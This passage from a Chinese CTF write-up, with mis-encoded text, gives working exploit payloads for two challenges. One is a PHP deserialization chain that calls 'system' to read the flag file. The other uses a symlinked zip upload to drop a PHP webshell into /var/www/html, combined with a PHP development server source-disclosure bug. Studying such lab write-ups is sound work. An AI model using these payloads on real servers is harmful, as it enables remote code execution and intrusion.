</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">contextName</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="o">-&gt;</span><span class="na">callbackFunction</span><span class="o">=</span><span class="s1">&#39;system&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„ï¼Œç”±äºprocessedContentæ˜¯ç§æœ‰å˜é‡ï¼Œæ‰€ä»¥è¦åŠ %00ï¼ˆå½“ç„¶ç›´æ¥æ‰“urlç¼–ç åçš„ä¹Ÿå¯ä»¥ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_to_check</span><span class="o">=</span><span class="nx">O</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="s2">&#34;ApplicationContext&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;contextName&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;FileManager&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">&#34;targetFile&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="s2">&#34;ContentProcessor&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="s2">&#34;%00ContentProcessor%00processedContent&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="s2">&#34;FunctionInvoker&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;functionName&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">&#34;functionArguments&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="s2">&#34;callbackFunction&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;system&#34;</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;responseData&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="s2">&#34;default_response&#34;</span><span class="p">;}}</span><span class="o">&amp;</span><span class="nx">method</span><span class="o">=</span><span class="nx">performWriteOperation</span><span class="o">&amp;</span><span class="k">var</span><span class="o">=</span><span class="nx">processedContent</span><span class="o">&amp;</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">f</span><span class="o">*&amp;</span><span class="nx">submit_md5</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-nss-4th/image-20250916154830372.png"
	width="1414"
	height="459"
	srcset="/p/2025-nss-4th/image-20250916154830372_hu_ce9d9daf69d7f373.png 480w, /p/2025-nss-4th/image-20250916154830372_hu_ac2a6066e23c9b62.png 1024w"
	loading="lazy"
	
		alt="image-20250916154830372"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="739px"
	
></p>
<p>å…¶å®å°±æ˜¯ç®€å•ååºåˆ—åŒ–ï¼Œä¸è¦è¢«è¿™ä¹ˆå¤šä»£ç å“åˆ°äº†</p>
<h2 id="ez_upload">ez_upload
</h2><h3 id="è€ƒç‚¹php-development-serveræºç æ³„éœ²è½¯é“¾æ¥">è€ƒç‚¹ï¼šphp development serveræºç æ³„éœ²+è½¯é“¾æ¥
</h3><p>çœ‹çœ‹æŠ¥é”™é¡µ</p>
<p><img src="/p/2025-nss-4th/image-20250916165532940.png"
	width="726"
	height="194"
	srcset="/p/2025-nss-4th/image-20250916165532940_hu_aab33c85372b0757.png 480w, /p/2025-nss-4th/image-20250916165532940_hu_8d1abc6e80e2f01f.png 1024w"
	loading="lazy"
	
		alt="image-20250916165532940"
	
	
		class="gallery-image" 
		data-flex-grow="374"
		data-flex-basis="898px"
	
></p>
<p>é—®ä¸€ä¸‹aiï¼Œå‘ç°æŠ¥é”™é¡µèƒ½çœ‹å‡ºæ¥æ˜¯php development server</p>
<p><img src="/p/2025-nss-4th/image-20250916165551439.png"
	width="750"
	height="235"
	srcset="/p/2025-nss-4th/image-20250916165551439_hu_b3c153d4e3d7d1bd.png 480w, /p/2025-nss-4th/image-20250916165551439_hu_f2faf9f5b6c6be9e.png 1024w"
	loading="lazy"
	
		alt="image-20250916165551439"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="765px"
	
></p>
<p>å‚è€ƒæ­¤æ–‡æ‹¿åˆ°æºç </p>
<p><a class="link" href="https://projectdiscovery.io/blog/php-http-server-source-disclosure"  target="_blank" rel="noopener"
    >PHP Development Server &lt;= 7.4.21 - Remote Source Disclosure â€” ProjectDiscovery Blog</a></p>
<p><img src="/p/2025-nss-4th/image-20250916164646758.png"
	width="1219"
	height="467"
	srcset="/p/2025-nss-4th/image-20250916164646758_hu_5c4e06cf693e4c8b.png 480w, /p/2025-nss-4th/image-20250916164646758_hu_e644554ff220b8a8.png 1024w"
	loading="lazy"
	
		alt="image-20250916164646758"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="626px"
	
></p>
<p>å…ˆåˆ›å»ºè½¯è¿æ¥(å‘½ä»¤éƒ½åœ¨linuxä¸Šè¿›è¡Œ)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span> <span class="n">link</span>
</span></span><span class="line"><span class="cl"><span class="n">zip</span> <span class="o">--</span><span class="n">symlinks</span> <span class="n">link</span><span class="o">.</span><span class="n">zip</span> <span class="n">link</span>	<span class="p">(</span><span class="n">symlinksçš„ä½œç”¨æ˜¯ä¸æŠŠorangeè¿™ä¸ªè½¯é“¾æ¥å½“ä½œæ™®é€šçš„æ–‡ä»¶</span><span class="err">ï¼Œè€Œæ˜¯å½“ä½œæŒ‡å‘ç›®å½•æˆ–è€…æ–‡ä»¶çš„å­˜åœ¨</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶ååˆ å»linkï¼Œå»ºä¸€ä¸ªlinkæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å†™ä¸€ä¸ª1.phpï¼Œå†…å®¹æ˜¯æœ¨é©¬ï¼Œç„¶åæ‰“åŒ…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zip -r link1.zip link/1.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä»¥æ­¤ä¸Šä¼ link.zipä¸link1.zip,ç„¶å1.phpå°±åˆ°äº†/var/www/htmlä¸‹äº†</p>
<p><img src="/p/2025-nss-4th/image-20250916161908535.png"
	width="1667"
	height="324"
	srcset="/p/2025-nss-4th/image-20250916161908535_hu_72dc6eea0fbfc5ec.png 480w, /p/2025-nss-4th/image-20250916161908535_hu_d8edac8119fd653d.png 1024w"
	loading="lazy"
	
		alt="image-20250916161908535"
	
	
		class="gallery-image" 
		data-flex-grow="514"
		data-flex-basis="1234px"
	
></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/emo/">Emo</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>è°¢è°¢è§‚çœ‹</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ˜¥ç§‹é•¿åŸæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025n1ctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025N1CTF</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ¹¾åŒºæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E5%87%BA%E9%A2%98/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-å‡ºé¢˜</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-netdreamctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-NetDreamctf</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo=""
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2025 - 
        
        2026 luokaihong
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
